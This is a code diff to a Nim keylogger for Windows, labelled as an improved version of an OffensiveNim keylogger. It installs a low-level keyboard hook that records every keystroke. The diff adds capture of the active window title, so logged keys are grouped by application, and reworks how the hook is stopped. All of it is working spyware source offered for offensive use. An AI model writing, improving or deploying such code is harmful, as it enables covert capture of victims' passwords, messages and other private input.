@@ -1,6 +1,9 @@
+# imporved version of https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/keylogger_bin.nim
+
 import winim
 import tables
 import strutils
+import strformat
 import threadpool
 
 type
@@ -288,21 +291,24 @@ const
     }.toTable()
 
 var channel_klout: Channel[string]
-var channel_stop: Channel[string]
+var channel_klstop: Channel[int]
+
+var currentActiveWindow : LPWSTR 
+
+proc GetActiveWindowTitle(): LPWSTR {.gcsafe.} = 
+    var capacity: int32 = 256
+    var builder: LPWSTR = newString(capacity)
+    var wHandle = GetForegroundWindow()
+    defer: CloseHandle(wHandle)
+    GetWindowText(wHandle, builder, capacity)
+    return builder
 
 
 proc hook_callback(nCode: int32, wParam: WPARAM, lParam: LPARAM): LRESULT {.stdcall, gcsafe.} =  
-    
-    # Check if we should keylog_stop called
-    var tried = channel_stop.tryRecv()
-    if tried.dataAvailable:
-        if tried.msg == "stop":
-            ExitThread(0)
 
     if nCode >= 0 and wParam == WM_KEYDOWN:
         var keypressed: string
         var kbdstruct: PKBDLLHOOKSTRUCT = cast[ptr KBDLLHOOKSTRUCT](lparam)
-
         var shifted: bool = (GetKeyState(160) < 0) or (GetKeyState(161) < 0)
         var keycode: Keys = cast[Keys](kbdstruct.vkCode)
 
@@ -316,10 +322,14 @@ proc hook_callback(nCode: int32, wParam: WPARAM, lParam: LPARAM): LRESULT {.stdc
                 keypressed = $toLowerAscii(chr(ord(keycode)))
             else:
                 keypressed = $toUpperAscii(chr(ord(keycode)))
+        
+        var newActiveWindow = GetActiveWindowTitle()
 
+        if $newActiveWindow != $currentActiveWindow:
+            currentActiveWindow = newActiveWindow
+            channel_klout.send("\n" & fmt"[Window: '{currentActiveWindow}']" & "\n")
         # Send key pressed to queue
         channel_klout.send(keypressed)
-
 
     return CallNextHookEx(0, nCode, wParam, lParam)
 
@@ -328,17 +338,20 @@ proc keylog() {.gcsafe.} =
     var hook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC) hook_callback, 0,  0)
     if bool(hook):
         try:
-            PostMessage(0, 0, 0, 0)
             var msg: MSG
-            while GetMessage(msg.addr, 0, 0, 0):
-                discard
+            while true:
+                var tried = channel_klstop.tryRecv()
+                if tried.dataAvailable:
+                    break
+                GetMessage(msg.addr, 0, 0, 0)
+
         finally:
             UnhookWindowsHookEx(hook)
 
 
 proc keylog_start*() =
     channel_klout.open()
-    channel_stop.open()
+    channel_klstop.open()
     spawn keylog()
 
 
@@ -350,13 +363,10 @@ proc keylog_dump*(): string =
             keylog_out &= tried.msg
         else:
             break
-    return keylog_out
+    return keylog_out[1..<keylog_out.len]  # keylog_out[0] = '\n'
 
 
 proc keylog_stop*(): string =
     var keylog_out = keylog_dump()
-    channel_stop.send("stop")
+    channel_klstop.send(1)
     return keylog_out
-
-
-
